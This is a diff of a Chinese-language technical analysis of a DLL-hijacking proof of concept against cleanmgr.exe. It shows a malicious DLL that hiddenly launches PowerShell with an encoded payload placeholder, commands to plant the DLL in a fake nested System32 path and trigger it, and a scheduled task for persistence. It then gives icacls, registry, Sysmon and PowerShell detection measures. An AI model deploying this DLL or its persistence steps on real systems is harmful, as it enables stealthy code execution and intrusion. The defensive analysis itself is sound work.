@@ -70,17 +70,17 @@ PoC代码技术解析
 恶意DLL构造逻辑  
 ```
 // 导出函数与合法dokan1.dll完全一致，避免触发异常
-__declspec(dllexport) void DokanMain() { 
-    static BOOL bExecuted = FALSE;
-    if (!bExecuted) {
-        bExecuted = TRUE;
-        // 隐蔽启动PowerShell（无窗口）
-        STARTUPINFO si = { sizeof(si) };
-        PROCESS_INFORMATION pi;
-        CreateProcessW(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", 
-                       L" -WindowStyle Hidden -EncodedCommand <BASE64_PAYLOAD>", 
-                       NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    }
+__declspec(dllexport) void DokanMain() { 
+    static BOOL bExecuted = FALSE;
+    if (!bExecuted) {
+        bExecuted = TRUE;
+        // 隐蔽启动PowerShell（无窗口）
+        STARTUPINFO si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        CreateProcessW(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", 
+                       L" -WindowStyle Hidden -EncodedCommand <BASE64_PAYLOAD>", 
+                       NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    }
 }
 ```  
   
@@ -101,7 +101,7 @@ __declspec(dllexport) void DokanDebugMode() { DokanMain(); }
 部署与触发  
 ```
 # 将恶意DLL写入伪造路径
-mkdir -p C:\Users\test\System32\System32\System32\
+mkdir -p C:\Users\test\System32\System32\System32\
 copy .\malicious.dll C:\Users\test\System32\System32\System32\dokannp1.dll
 # 触发cleanmgr.exe（需等待计划任务或手动执行）
 cleanmgr /sageset:2
@@ -115,7 +115,7 @@ cleanmgr /sageset:2
   
 通过恶意DLL创建计划任务，实现重启后维持权限。  
 ```
-schtasks /create /tn "CleanupTrigger" /tr "cleanmgr /sageset:2" /sc hourly /mo 1
+schtasks /create /tn "CleanupTrigger" /tr "cleanmgr /sageset:2" /sc hourly /mo 1
 ```  
   
 服务安装：  
@@ -140,7 +140,7 @@ DLL白名单绕过：
   
 使用ICACLS禁止用户创建System32嵌套目录：  
 ```
-icacls "C:\Users\%USERNAME%\System32" /deny Everyone:(OI)(CI)(DC)(DE,WD)
+icacls "C:\Users\%USERNAME%\System32" /deny Everyone:(OI)(CI)(DC)(DE,WD)
 ```  
   
   
@@ -148,7 +148,7 @@ DLL加载策略：
   
 通过组策略启用SetDefaultDllDirectories，限制DLL搜索路径：  
 ```
-New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "CWDIllegalInDllSearch" -Value 0x1 -Type DWORD
+New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "CWDIllegalInDllSearch" -Value 0x1 -Type DWORD
 ```  
   
 2. 检测技术  
@@ -157,11 +157,11 @@ Sysmon监控：
   
 配置规则检测异常DLL加载事件：  
 ```
-<RuleGroup name="DLL Hijacking">
-  <ImageLoad onmatch="include">
-    <ImageLoaded condition="contains">System32\System32\System32\</ImageLoaded>
-    <Signature condition="not contains">Microsoft Corporation</Signature>
-  </ImageLoad>
+<RuleGroup name="DLL Hijacking">
+  <ImageLoad onmatch="include">
+    <ImageLoaded condition="contains">System32\System32\System32\</ImageLoaded>
+    <Signature condition="not contains">Microsoft Corporation</Signature>
+  </ImageLoad>
 </RuleGroup>
 ```  
   
@@ -172,8 +172,8 @@ PowerShell脚本扫描：
   
 快速检测用户目录下的可疑路径：  
 ```
-Get-ChildItem -Path "C:\Users\" -Recurse -Force -ErrorAction SilentlyContinue | 
-  Where-Object { $_.FullName -match "System32\\System32\\System32" }
+Get-ChildItem -Path "C:\Users\" -Recurse -Force -ErrorAction SilentlyContinue | 
+  Where-Object { $_.FullName -match "System32\\System32\\System32" }
 ```  
   
   
